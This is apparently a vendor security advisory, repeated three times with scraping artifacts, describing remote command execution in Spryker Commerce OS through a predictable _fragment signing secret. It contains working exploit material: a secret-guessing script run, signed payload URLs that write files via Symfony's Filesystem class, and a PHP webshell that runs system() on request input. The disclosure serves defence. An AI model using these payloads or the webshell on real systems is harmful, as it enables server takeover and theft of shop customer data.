Text-only version:
https://www.schutzwerk.com/advisories/SCHUTZWERK-SA-2022-003.txt
Affected products/vendor
========================
Spryker Commerce OS by Spryker Systems GmbH, with spryker/http module < 1.7.0
Summary
=======
A predictable value is used to sign and verify special \_fragment URLs in
Spryker Commerce OS with spryker/http module < 1.7.0. Attackers that can guess
this value are able to generate valid \_fragment URLs which allow calling PHP
methods, with certain restrictions. It could be demonstrated that this allows
attackers to write arbitrary content to files on the file system, which, in
turn, allows for execution of arbitrary PHP commands in many setups and
therefore remote command execution.
Risk
====
The vulnerability allows attackers to execute arbitrary commands on an
operating system-level on systems where the Spryker Commerce OS is installed.
In many cases, authentication is not necessary for successful exploitation. If
attackers have already determined that Spryker Commerce OS is utilized through
fingerprinting, checking for the presence of the vulnerability is trivial. With
the ability to execute arbitrary commands, attacks can, for example, access
customer data of the affected shop.
Description
===========
A webshop that was recently assessed for security vulnerabilities by SCHUTZWERK
was found to contain a remote command execution vulnerability. The application
in scope is based on a framework by Spryker -- Spryker Commerce OS. Spryker's
framework, in turn, is based on Symfony[0] and/or Silex[1].
Symfony and Silex both support a special \_fragment endpoint. This feature was
analyzed by Ambionics Security[2] in 2020. In their write up, the feature is
described as follows:
One of Symfony's built-in features, made to handle ESI (Edge-Side
Includes)[3], is the FragmentListener class[4]. Essentially, when someone
issues a request to /\_fragment, this listener sets request attributes from
given GET parameters. Since this allows to run arbitrary PHP code [...],
the request has to be signed using a HMAC value. [...]
[...] Given its importance, [the secret used for signing] must obviously be
very random.
At least parts of the source code of the Spryker framework are open source and
publicly accessible via GitHub. During the assessment, while certain
security-sensitive parts of the source code were reviewed, it was discovered
that the secret used to sign and verify \_fragment URLs is static and
predictable. The secret is set to md5(\_\_DIR\_\_) in the PHP file
HttpFragmentServiceProvider.php[5] and in two different HttpConfig.php[6][7]
files.
\_\_DIR\_\_ is a built-in "magic constant" in PHP[8] and it corresponds to "the
directory of the file". It is not entirely clear, which of these PHP files is
actually included and loaded by the Spryker framework. However, it is assumed
that the file http/src/Spryker/Shared/Http/HttpConfig.php is the culprit.
Guessing the secret
^^^^^^^^^^^^^^^^^^^
In order to gain a better understanding of the vulnerability, SCHUTZWERK set up
a local Spryker development instance with a demo shop[9] in order to allow for
more in-depth debugging.
By inspecting the source code and adding appropriate debug statements, the
secret was identified as e3ae11e53f7c3d72da08784b9af763f9. This corresponds to
the MD5 sum of the path
/data/shop/development/current/vendor/spryker/http/src/Spryker/Shared/Http:
$ echo -n '/data/shop/development/current/vendor/spryker/http/src/Spryker/'\
'Shared/Http'| md5sum
e3ae11e53f7c3d72da08784b9af763f9 -
The proof-of-concept script find\_secret.py[10] was developed in order to
automate the process of identifying the secret based on a list of known Spryker
paths. The script was executed as follows against the local development
instance and correctly identified the static secret:
$ python3 find\_secret.py --path-list known\_spryker\_paths.txt \
http://www.de.b2b-demo-shop.local/\_fragment
[-] http://www.de.b2b-demo-shop.local/\_fragment 2c03fc8fac1ff5204b56d4dbf879a3fc
[-] http://www.de.b2b-demo-shop.local/\_fragment f71e9665ffe0a0e3b54bbe7c2642d466
[-] http://www.de.b2b-demo-shop.local/\_fragment faf0d063ad6adf3776d59bc55a17aa5f
[+] http://www.de.b2b-demo-shop.local/\_fragment e3ae11e53f7c3d72da08784b9af763f9
(/data/shop/development/current/vendor/spryker/http/src/Spryker/Shared/Http)
This verification step does not require authentication in the default
configuration. The script generates \_fragment URLs based on a provided list of
paths and detects whether the server views these URLs as valid (correctly
signed) or not. This distinction is made based on different observations (e.g.
status code, response content, etc.).
The same script was then executed against the customer's instance:
$ python3 find\_secret.py --path-list known\_spryker\_paths.txt \
[CUSTOMER\_DOMAIN]/\_fragment
[-] [CUSTOMER\_DOMAIN]/\_fragment e3ae11e53f7c3d72da08784b9af763f9
[-] [CUSTOMER\_DOMAIN]/\_fragment faf0d063ad6adf3776d59bc55a17aa5f
[-] [CUSTOMER\_DOMAIN]/\_fragment 8399015c0dbbf2162983fb7ad0ea6a9a
[-] [CUSTOMER\_DOMAIN]/\_fragment 8baff412797b1ddd80cd968e7446aa06
[...]
[-] [CUSTOMER\_DOMAIN]/\_fragment 2c03fc8fac1ff5204b56d4dbf879a3fc
[-] [CUSTOMER\_DOMAIN]/\_fragment d6de8df0b4ad55b15f198e06142dd0e6
[-] [CUSTOMER\_DOMAIN]/\_fragment d6de8df0b4ad55b15f198e06142dd0e6
[+] [CUSTOMER\_DOMAIN]/\_fragment 9c15f40d8e5610e89caf6f9b7a97be3b
(/data/srv/yves/www/vendor/spryker/http/src/Spryker/Shared/Http)
In this case, the identified secret 9c15f40d8e5610e89caf6f9b7a97be3b
corresponds to the path
/data/srv/yves/www/vendor/spryker/http/src/Spryker/Shared/Http.
The installation path of the application can of course vary greatly between
installations. However, if customers use the official Docker guide provided by
Spryker, it is likely that they will use the paths utilized in the examples and
thus share a common installation path.
Even if this is not the case, customers might share installation paths between
multiple environments (development, production). A compromise of one
installation would therefore make a compromise of the other installations
likely.
Signing URLs
^^^^^^^^^^^^
In addition to the secret, a URL must be passed to the HMAC function to form
the signature. However, in both instances of the vulnerability that were
discovered during the assessment, the URL was the same as the external URL.
This might be true for all Commerce OS installations.
With a valid secret and a URL, it is now possible to sign URLs. As shown in the
write up of Ambionics Security, it is generally possible to execute arbitrary
commands using different methods (direct reference of a PHP class/method or
deserialization of PHP objects). However, both approaches did not work, likely
due to code changes made by Spryker to Symfony/Silex.
Generally, the correct syntax for \_fragment URLs is the following:
:///\_fragment?\_path=\_controller=&
\_hash=
Through further analysis, an alternative approach was discovered. Replacing the
value of the URL parameter \_path in the listing above allows to specify PHP
classes with certain limitations (decoded and reformatted for increased
readability):
\_controller[]=Path\To\Class&
\_controller[]=nameOfMethod&
arg1=value
At least the following limitations apply:
\* Class must have no initialize function or, alternatively, an initialize
function without arguments
\* Class must have an constructor without arguments
While examining the source code for possible candidates, the Symfony class
Filesystem was discovered. This class meets the limitations and allows writing
arbitrary content to a specified file path. The following payload was created
(decoded and reformatted for increased readability):
\_controller[]=Symfony\Component\Filesystem\Filesystem&
\_controller[]=appendToFile&
filename=SCHUTZWERK.php&
content=TEST
The generated URL is as follows:
http://www.de.b2b-demo-shop.local/\_fragment?\_path=\_controller%255B%255D%3DSymfony%255C
Component%255CFilesystem%255CFilesystem%26\_controller%255B%255D%3DappendToFile%26
filename%3D%252Ftmp%252Fschutzwerk.php%26content%3DTEST&
\_hash=8Phw5nGDW%2FDgLe%2Fvpep0Exzz%2BIsptnd%2FyOb4G5CT12U%3D
After execution, the content is written to the file:
vagrant@vm-b2b-demo-shop / $ cat /tmp/schutzwerk.php
TEST
With this primitive in place, it is possible to execute arbitrary PHP code and
subsequently commands on an operating system level. To demonstrate this, the
following PHP code for a minimal webshell was appended to the file
/data/shop/development/current/public/Yves/maintenance/maintenance.php in the
development instance:
if(isset($\_GET['pass'])){
if($\_GET['pass']=="yunn@swervIfUf3"){
if(isset($\_REQUEST['cmd'])){
echo "
```
";
      $cmd=($_REQUEST['cmd']);
      system($cmd);
      echo "
```
";
die;
}
}
}
The generated URL is as follows:
http://www.de.b2b-demo-shop.local/\_fragment?\_path=\_controller%255B%255D%3DSymfony%255C
Component%255CFilesystem%255CFilesystem%26\_controller%255B%255D%3DappendToFile%26

Afterwards, the file contains the following content:
php
[...]
if (file\_exists(\_\_DIR\_\_ . '/maintenance.marker')) {
http\_response\_code(503);
echo file\_get\_contents(\_\_DIR\_\_ . '/index.html');
exit(0);
}
if(isset($\_GET['pass'])){
if($\_GET['pass']=="yunn@swervIfUf3"){
if(isset($\_REQUEST['cmd'])){
echo "<pre";
$cmd=($\_REQUEST['cmd']);
system($cmd);
echo "";
die;
}
}
}
Since the PHP file maintenance.php is consulted for every request, the injected
PHP webshell code can be executed using URLs similar to the following:
http://www.de.b2b-demo-shop.local/?pass=yunn@swervIfUf3&cmd=id
Solution/Mitigation

SCHUTZWERK-SA-2022-003: Remote Command Execution in Spryker Commerce OS

Status

CVE reference

Text-only version:
<https://www.schutzwerk.com/advisories/SCHUTZWERK-SA-2022-003.txt>

Affected products/vendor
========================

```
Spryker Commerce OS by Spryker Systems GmbH, with spryker/http module <
1.7.0
```

Summary
=======

A predictable value is used to sign and verify special _fragment URLs in

```
Spryker Commerce OS with spryker/http module < 1.7.0. Attackers that can
guess
```

this value are able to generate valid _fragment URLs which allow calling PHP

```
methods, with certain restrictions. It could be demonstrated that this
allows
```

attackers to write arbitrary content to files on the file system, which, in
turn, allows for execution of arbitrary PHP commands in many setups and
therefore remote command execution.

Risk
====

The vulnerability allows attackers to execute arbitrary commands on an

```
operating system-level on systems where the Spryker Commerce OS is
installed.
In many cases, authentication is not necessary for successful
exploitation. If
attackers have already determined that Spryker Commerce OS is utilized
through
fingerprinting, checking for the presence of the vulnerability is
trivial. With
```

the ability to execute arbitrary commands, attacks can, for example, access
customer data of the affected shop.

Description
===========

```
A webshop that was recently assessed for security vulnerabilities by
SCHUTZWERK
was found to contain a remote command execution vulnerability. The
application
in scope is based on a framework by Spryker -- Spryker Commerce OS.
Spryker's
```

framework, in turn, is based on Symfony[0] and/or Silex[1].

```
Symfony and Silex both support a special \_fragment endpoint. This
feature was
```

analyzed by Ambionics Security[2] in 2020. In their write up, the feature is
described as follows:

  One of Symfony's built-in features, made to handle ESI (Edge-Side
  Includes)[3], is the FragmentListener class[4]. Essentially, when someone

```
 issues a request to /\_fragment, this listener sets request attributes
from
```

  given GET parameters. Since this allows to run arbitrary PHP code [...],
  the request has to be signed using a HMAC value. [...]

```
 [...] Given its importance, [the secret used for signing] must
obviously be
```

  very random.

```
At least parts of the source code of the Spryker framework are open
source and
```

publicly accessible via GitHub. During the assessment, while certain
security-sensitive parts of the source code were reviewed, it was discovered
that the secret used to sign and verify _fragment URLs is static and
predictable. The secret is set to md5(__DIR__) in the PHP file
HttpFragmentServiceProvider.php[5] and in two different HttpConfig.php[6][7]
files.

__DIR__ is a built-in "magic constant" in PHP[8] and it corresponds to "the

```
directory of the file". It is not entirely clear, which of these PHP
files is
actually included and loaded by the Spryker framework. However, it is
assumed
```

that the file http/src/Spryker/Shared/Http/HttpConfig.php is the culprit.

Guessing the secret
^^^^^^^^^^^^^^^^^^^

```
In order to gain a better understanding of the vulnerability, SCHUTZWERK
set up
a local Spryker development instance with a demo shop[9] in order to
allow for
```

more in-depth debugging.

By inspecting the source code and adding appropriate debug statements, the

```
secret was identified as e3ae11e53f7c3d72da08784b9af763f9. This
corresponds to
```

the MD5 sum of the path
/data/shop/development/current/vendor/spryker/http/src/Spryker/Shared/Http:

$ echo -n '/data/shop/development/current/vendor/spryker/http/src/Spryker/'\
'Shared/Http'| md5sum
e3ae11e53f7c3d72da08784b9af763f9  -

The proof-of-concept script find_secret.py[10] was developed in order to

```
automate the process of identifying the secret based on a list of known
Spryker
```

paths. The script was executed as follows against the local development
instance and correctly identified the static secret:

$ python3 find_secret.py --path-list known_spryker_paths.txt \
<http://www.de.b2b-demo-shop.local/_fragment>

```
[-] <http://www.de.b2b-demo-shop.local/_fragment>
2c03fc8fac1ff5204b56d4dbf879a3fc
[-] <http://www.de.b2b-demo-shop.local/_fragment>
f71e9665ffe0a0e3b54bbe7c2642d466
[-] <http://www.de.b2b-demo-shop.local/_fragment>
faf0d063ad6adf3776d59bc55a17aa5f
[+] <http://www.de.b2b-demo-shop.local/_fragment>
e3ae11e53f7c3d72da08784b9af763f9
```

(/data/shop/development/current/vendor/spryker/http/src/Spryker/Shared/Http)

This verification step does not require authentication in the default

```
configuration. The script generates \_fragment URLs based on a provided
list of
```

paths and detects whether the server views these URLs as valid (correctly

```
signed) or not. This distinction is made based on different observations
(e.g.
```

status code, response content, etc.).

The same script was then executed against the customer's instance:

$ python3 find_secret.py --path-list known_spryker_paths.txt \
[CUSTOMER_DOMAIN]/_fragment
[-] [CUSTOMER_DOMAIN]/_fragment e3ae11e53f7c3d72da08784b9af763f9
[-] [CUSTOMER_DOMAIN]/_fragment faf0d063ad6adf3776d59bc55a17aa5f
[-] [CUSTOMER_DOMAIN]/_fragment 8399015c0dbbf2162983fb7ad0ea6a9a
[-] [CUSTOMER_DOMAIN]/_fragment 8baff412797b1ddd80cd968e7446aa06
[...]
[-] [CUSTOMER_DOMAIN]/_fragment 2c03fc8fac1ff5204b56d4dbf879a3fc
[-] [CUSTOMER_DOMAIN]/_fragment d6de8df0b4ad55b15f198e06142dd0e6
[-] [CUSTOMER_DOMAIN]/_fragment d6de8df0b4ad55b15f198e06142dd0e6
[+] [CUSTOMER_DOMAIN]/_fragment 9c15f40d8e5610e89caf6f9b7a97be3b
    (/data/srv/yves/www/vendor/spryker/http/src/Spryker/Shared/Http)

In this case, the identified secret 9c15f40d8e5610e89caf6f9b7a97be3b
corresponds to the path
/data/srv/yves/www/vendor/spryker/http/src/Spryker/Shared/Http.

The installation path of the application can of course vary greatly between

```
installations. However, if customers use the official Docker guide
provided by
Spryker, it is likely that they will use the paths utilized in the
examples and
```

thus share a common installation path.

```
Even if this is not the case, customers might share installation paths
between
```

multiple environments (development, production). A compromise of one
installation would therefore make a compromise of the other installations
likely.

Signing URLs
^^^^^^^^^^^^

In addition to the secret, a URL must be passed to the HMAC function to form
the signature. However, in both instances of the vulnerability that were
discovered during the assessment, the URL was the same as the external URL.
This might be true for all Commerce OS installations.

```
With a valid secret and a URL, it is now possible to sign URLs. As shown
in the
write up of Ambionics Security, it is generally possible to execute
arbitrary
```

commands using different methods (direct reference of a PHP class/method or

```
deserialization of PHP objects). However, both approaches did not work,
likely
```

due to code changes made by Spryker to Symfony/Silex.

Generally, the correct syntax for _fragment URLs is the following:

```
<protocol>://<domain>/\_fragment?\_path=\_controller=<controller
specification>&
```

_hash=<valid URL signature>

```
Through further analysis, an alternative approach was discovered.
Replacing the
```

value of the URL parameter _path in the listing above allows to specify PHP
classes with certain limitations (decoded and reformatted for increased
readability):

_controller[]=Path\To\Class&
_controller[]=nameOfMethod&
arg1=value

At least the following limitations apply:

*  Class must have no initialize function or, alternatively, an initialize
function without arguments
*  Class must have an constructor without arguments

While examining the source code for possible candidates, the Symfony class

```
Filesystem was discovered. This class meets the limitations and allows
writing
arbitrary content to a specified file path. The following payload was
created
```

(decoded and reformatted for increased readability):

_controller[]=Symfony\Component\Filesystem\Filesystem&
_controller[]=appendToFile&
filename=SCHUTZWERK.php&
content=TEST

The generated URL is as follows:

<http://www.de.b2b-demo-shop.local/_fragment?_path=_controller%255B%255D%3DSymfony%255C>
Component%255CFilesystem%255CFilesystem%26_controller%255B%255D%3DappendToFile%26
filename%3D%252Ftmp%252Fschutzwerk.php%26content%3DTEST&
_hash=8Phw5nGDW%2FDgLe%2Fvpep0Exzz%2BIsptnd%2FyOb4G5CT12U%3D

After execution, the content is written to the file:

vagrant@vm-b2b-demo-shop / $ cat /tmp/schutzwerk.php
TEST

```
With this primitive in place, it is possible to execute arbitrary PHP
code and
```

subsequently commands on an operating system level. To demonstrate this, the
following PHP code for a minimal webshell was appended to the file

```
/data/shop/development/current/public/Yves/maintenance/maintenance.php
in the
```

development instance:

if(isset($_GET['pass'])){
  if($_GET['pass']=="yunn@swervIfUf3"){
    if(isset($_REQUEST['cmd'])){
      echo "<pre>";
      $cmd=($_REQUEST['cmd']);
      system($cmd);
      echo "</pre>";
      die;
    }
  }
}

The generated URL is as follows:

<http://www.de.b2b-demo-shop.local/_fragment?_path=_controller%255B%255D%3DSymfony%255C>

Afterwards, the file contains the following content:

<?php
[...]
if (file_exists(__DIR__ . '/maintenance.marker')) {
  http_response_code(503);
  echo file_get_contents(__DIR__ . '/index.html');
  exit(0);
}
if(isset($_GET['pass'])){
if($_GET['pass']=="yunn@swervIfUf3"){
  if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd=($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
  }
}
}

```
Since the PHP file maintenance.php is consulted for every request, the
injected
```

PHP webshell code can be executed using URLs similar to the following:

<http://www.de.b2b-demo-shop.local/?pass=yunn@swervIfUf3&cmd=id>

Solution/Mitigation
===================

1. Update spryker/http module to version 1.7.0

```
2. Configure SPRYKER\_ZED\_REQUEST\_TOKEN environment variable with a long,
random
```

and secure string

Affected products/vendor
========================

Spryker Commerce OS by Spryker Systems GmbH, with spryker/http module < 1.7.0

Summary
=======

A predictable value is used to sign and verify special _fragment URLs in
Spryker Commerce OS with spryker/http module < 1.7.0. Attackers that can guess
this value are able to generate valid _fragment URLs which allow calling PHP
methods, with certain restrictions. It could be demonstrated that this allows
attackers to write arbitrary content to files on the file system, which, in
turn, allows for execution of arbitrary PHP commands in many setups and
therefore remote command execution.

Risk
====

The vulnerability allows attackers to execute arbitrary commands on an
operating system-level on systems where the Spryker Commerce OS is installed.
In many cases, authentication is not necessary for successful exploitation. If
attackers have already determined that Spryker Commerce OS is utilized through
fingerprinting, checking for the presence of the vulnerability is trivial. With
the ability to execute arbitrary commands, attacks can, for example, access
customer data of the affected shop.

Description
===========

A webshop that was recently assessed for security vulnerabilities by SCHUTZWERK
was found to contain a remote command execution vulnerability. The application
in scope is based on a framework by Spryker -- Spryker Commerce OS. Spryker's
framework, in turn, is based on Symfony[0] and/or Silex[1].

Symfony and Silex both support a special _fragment endpoint. This feature was
analyzed by Ambionics Security[2] in 2020. In their write up, the feature is
described as follows:

  One of Symfony's built-in features, made to handle ESI (Edge-Side
  Includes)[3], is the FragmentListener class[4]. Essentially, when someone
  issues a request to /_fragment, this listener sets request attributes from
  given GET parameters. Since this allows to run arbitrary PHP code [...],
  the request has to be signed using a HMAC value. [...]

  [...] Given its importance, [the secret used for signing] must obviously be
  very random.

At least parts of the source code of the Spryker framework are open source and
publicly accessible via GitHub. During the assessment, while certain
security-sensitive parts of the source code were reviewed, it was discovered
that the secret used to sign and verify _fragment URLs is static and
predictable. The secret is set to md5(__DIR__) in the PHP file
HttpFragmentServiceProvider.php[5] and in two different HttpConfig.php[6][7]
files.

__DIR__ is a built-in "magic constant" in PHP[8] and it corresponds to "the
directory of the file". It is not entirely clear, which of these PHP files is
actually included and loaded by the Spryker framework. However, it is assumed
that the file http/src/Spryker/Shared/Http/HttpConfig.php is the culprit.

Guessing the secret
^^^^^^^^^^^^^^^^^^^

In order to gain a better understanding of the vulnerability, SCHUTZWERK set up
a local Spryker development instance with a demo shop[9] in order to allow for
more in-depth debugging.

By inspecting the source code and adding appropriate debug statements, the
secret was identified as e3ae11e53f7c3d72da08784b9af763f9. This corresponds to
the MD5 sum of the path
/data/shop/development/current/vendor/spryker/http/src/Spryker/Shared/Http:

$ echo -n '/data/shop/development/current/vendor/spryker/http/src/Spryker/'\
'Shared/Http'| md5sum
e3ae11e53f7c3d72da08784b9af763f9  -

The proof-of-concept script find_secret.py[10] was developed in order to
automate the process of identifying the secret based on a list of known Spryker
paths. The script was executed as follows against the local development
instance and correctly identified the static secret:

$ python3 find_secret.py --path-list known_spryker_paths.txt \
http://www.de.b2b-demo-shop.local/_fragment
[-] http://www.de.b2b-demo-shop.local/_fragment 2c03fc8fac1ff5204b56d4dbf879a3fc
[-] http://www.de.b2b-demo-shop.local/_fragment f71e9665ffe0a0e3b54bbe7c2642d466
[-] http://www.de.b2b-demo-shop.local/_fragment faf0d063ad6adf3776d59bc55a17aa5f
[+] http://www.de.b2b-demo-shop.local/_fragment e3ae11e53f7c3d72da08784b9af763f9
    (/data/shop/development/current/vendor/spryker/http/src/Spryker/Shared/Http)

This verification step does not require authentication in the default
configuration. The script generates _fragment URLs based on a provided list of
paths and detects whether the server views these URLs as valid (correctly
signed) or not. This distinction is made based on different observations (e.g.
status code, response content, etc.).

The same script was then executed against the customer's instance:

$ python3 find_secret.py --path-list known_spryker_paths.txt \
[CUSTOMER_DOMAIN]/_fragment
[-] [CUSTOMER_DOMAIN]/_fragment e3ae11e53f7c3d72da08784b9af763f9
[-] [CUSTOMER_DOMAIN]/_fragment faf0d063ad6adf3776d59bc55a17aa5f
[-] [CUSTOMER_DOMAIN]/_fragment 8399015c0dbbf2162983fb7ad0ea6a9a
[-] [CUSTOMER_DOMAIN]/_fragment 8baff412797b1ddd80cd968e7446aa06
[...]
[-] [CUSTOMER_DOMAIN]/_fragment 2c03fc8fac1ff5204b56d4dbf879a3fc
[-] [CUSTOMER_DOMAIN]/_fragment d6de8df0b4ad55b15f198e06142dd0e6
[-] [CUSTOMER_DOMAIN]/_fragment d6de8df0b4ad55b15f198e06142dd0e6
[+] [CUSTOMER_DOMAIN]/_fragment 9c15f40d8e5610e89caf6f9b7a97be3b
    (/data/srv/yves/www/vendor/spryker/http/src/Spryker/Shared/Http)

In this case, the identified secret 9c15f40d8e5610e89caf6f9b7a97be3b
corresponds to the path
/data/srv/yves/www/vendor/spryker/http/src/Spryker/Shared/Http.

The installation path of the application can of course vary greatly between
installations. However, if customers use the official Docker guide provided by
Spryker, it is likely that they will use the paths utilized in the examples and
thus share a common installation path.

Even if this is not the case, customers might share installation paths between
multiple environments (development, production). A compromise of one
installation would therefore make a compromise of the other installations
likely.

Signing URLs
^^^^^^^^^^^^

In addition to the secret, a URL must be passed to the HMAC function to form
the signature. However, in both instances of the vulnerability that were
discovered during the assessment, the URL was the same as the external URL.
This might be true for all Commerce OS installations.

With a valid secret and a URL, it is now possible to sign URLs. As shown in the
write up of Ambionics Security, it is generally possible to execute arbitrary
commands using different methods (direct reference of a PHP class/method or
deserialization of PHP objects). However, both approaches did not work, likely
due to code changes made by Spryker to Symfony/Silex.

Generally, the correct syntax for _fragment URLs is the following:

<protocol>://<domain>/_fragment?_path=_controller=<controller specification>&
_hash=<valid URL signature>

Through further analysis, an alternative approach was discovered. Replacing the
value of the URL parameter _path in the listing above allows to specify PHP
classes with certain limitations (decoded and reformatted for increased
readability):

_controller[]=Path\To\Class&
_controller[]=nameOfMethod&
arg1=value

At least the following limitations apply:

*  Class must have no initialize function or, alternatively, an initialize
function without arguments
*  Class must have an constructor without arguments

While examining the source code for possible candidates, the Symfony class
Filesystem was discovered. This class meets the limitations and allows writing
arbitrary content to a specified file path. The following payload was created
(decoded and reformatted for increased readability):

_controller[]=Symfony\Component\Filesystem\Filesystem&
_controller[]=appendToFile&
filename=SCHUTZWERK.php&
content=TEST

The generated URL is as follows:

http://www.de.b2b-demo-shop.local/_fragment?_path=_controller%255B%255D%3DSymfony%255C
Component%255CFilesystem%255CFilesystem%26_controller%255B%255D%3DappendToFile%26
filename%3D%252Ftmp%252Fschutzwerk.php%26content%3DTEST&
_hash=8Phw5nGDW%2FDgLe%2Fvpep0Exzz%2BIsptnd%2FyOb4G5CT12U%3D

After execution, the content is written to the file:

vagrant@vm-b2b-demo-shop / $ cat /tmp/schutzwerk.php
TEST

With this primitive in place, it is possible to execute arbitrary PHP code and
subsequently commands on an operating system level. To demonstrate this, the
following PHP code for a minimal webshell was appended to the file
/data/shop/development/current/public/Yves/maintenance/maintenance.php in the
development instance:

if(isset($_GET['pass'])){
  if($_GET['pass']=="yunn@swervIfUf3"){
    if(isset($_REQUEST['cmd'])){
      echo "<pre>";
      $cmd=($_REQUEST['cmd']);
      system($cmd);
      echo "</pre>";
      die;
    }
  }
}

The generated URL is as follows:

http://www.de.b2b-demo-shop.local/_fragment?_path=_controller%255B%255D%3DSymfony%255C
Component%255CFilesystem%255CFilesystem%26_controller%255B%255D%3DappendToFile%26

Afterwards, the file contains the following content:

<?php
[...]
if (file_exists(__DIR__ . '/maintenance.marker')) {
  http_response_code(503);
  echo file_get_contents(__DIR__ . '/index.html');
  exit(0);
}
if(isset($_GET['pass'])){
if($_GET['pass']=="yunn@swervIfUf3"){
  if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd=($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
  }
}
}

Since the PHP file maintenance.php is consulted for every request, the injected
PHP webshell code can be executed using URLs similar to the following:

http://www.de.b2b-demo-shop.local/?pass=yunn@swervIfUf3&cmd=id

Solution/Mitigation
===================

1. Update spryker/http module to version 1.7.0
